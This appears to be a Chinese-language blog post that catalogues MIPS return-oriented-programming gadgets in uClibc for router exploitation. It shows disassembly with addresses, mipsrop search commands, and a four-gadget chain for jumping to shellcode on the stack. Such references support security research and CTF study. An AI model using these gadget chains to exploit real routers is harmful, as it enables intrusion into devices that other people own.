---
title: MIPS rop gadgets记录贴&&持续更新
authorId: hac425
tags:
  - mips rop
categories:
  - 路由器安全
date: 2017-10-27 15:01:00
---
### 前言

本帖记录一些常用的,效果好的 rop gadgets.

**uClibc**

**从栈中设置`$t9` 并跳到 `$t9` 的gadgets , `__thread_start` 函数第二行**

使用 [案例](https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%88%98.html)

使用tips:
- 调用函数时，进入函数内部时要求 `$t9` 指向函数的起始地址。

```
lw      $t9, arg_0($sp)
jalr    $t9

```

**四个组合使用，调用栈中 shellcode 的 rop_gadget , 需要可以控制 `$s1`,**

详细分析在[这里
](https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html)

rop_gadget 1, **设置 参数一 为 1**，位于 `__uClibc_main` ,可以使用 `mipsrop.find("li $a0, 1")` 查找
```
	LOAD:00055C60                 li      $a0, 1
	LOAD:00055C64                 move    $t9, $s1
	LOAD:00055C68                 jalr    $t9 ; sub_55960
	LOAD:00055C5C                 lui     $s0, 2
```

rop_gadget 2，**从栈中设置寄存器**，使用 `mipsrop.tail()` 查找
```
	LOAD:0001E20C                 move    $t9, $s1
	LOAD:0001E210                 lw      $ra, 0x28+var_4($sp)
	LOAD:0001E214                 lw      $s2, 0x28+var_8($sp)
	LOAD:0001E218                 lw      $s1, 0x28+var_C($sp)
	LOAD:0001E21C                 lw      $s0, 0x28+var_10($sp)
	LOAD:0001E220                 jr      $t9
	LOAD:0001E224                 addiu   $sp, 0x28

```

rop_gadget 3，**获取栈地址**，使用 `mipsrop.stackfinder()` 查找

```
	LOAD:000164C0                 addiu   $s2, $sp, 0x198+var_180
	LOAD:000164C4                 move    $a2, $v1
	LOAD:000164C8                 move    $t9, $s0
	LOAD:000164CC                 jalr    $t9 ; mempcpy
	LOAD:000164D0                 move    $a0, $s2

```
rop_gadget 4，**通过 `$t9`, 跳转到 `$s2`**，使用 `mipsrop.find("move    $t9, $s2")` 查找, 位于 `readdir`
```
	LOAD:000118A4                 move    $t9, $s2
	LOAD:000118A8                 jalr    $t9
```

**从栈中取数据到寄存器, `opendir`  函数尾部**
```
.text:0000AA6C                 lw      $ra, 0xC0+var_4($sp)
.text:0000AA70                 lw      $s2, 0xC0+var_8($sp)
.text:0000AA74                 lw      $s1, 0xC0+var_C($sp)
.text:0000AA78                 lw      $s0, 0xC0+var_10($sp)
.text:0000AA7C                 jr      $ra
.text:0000AA80                 addiu   $sp, 0xC0
.text:0000AA80  # End of function opendir
```

**从栈中设置基本上所有的重要寄存器，位于 `scandir` 或者 `scandir64`尾部**
```
LOAD:00011BB0                 lw      $ra, 0x40+var_4($sp)
LOAD:00011BB4                 lw      $fp, 0x40+var_8($sp)
LOAD:00011BB8                 lw      $s7, 0x40+var_C($sp)
LOAD:00011BBC                 lw      $s6, 0x40+var_10($sp)
LOAD:00011BC0                 lw      $s5, 0x40+var_14($sp)
LOAD:00011BC4                 lw      $s4, 0x40+var_18($sp)
LOAD:00011BC8                 lw      $s3, 0x40+var_1C($sp)
LOAD:00011BCC                 lw      $s2, 0x40+var_20($sp)
LOAD:00011BD0                 lw      $s1, 0x40+var_24($sp)
LOAD:00011BD4                 lw      $s0, 0x40+var_28($sp)
LOAD:00011BD8                 jr      $ra
LOAD:00011BDC                 addiu   $sp, 0x40
LOAD:00011BDC  # End of function scandir
```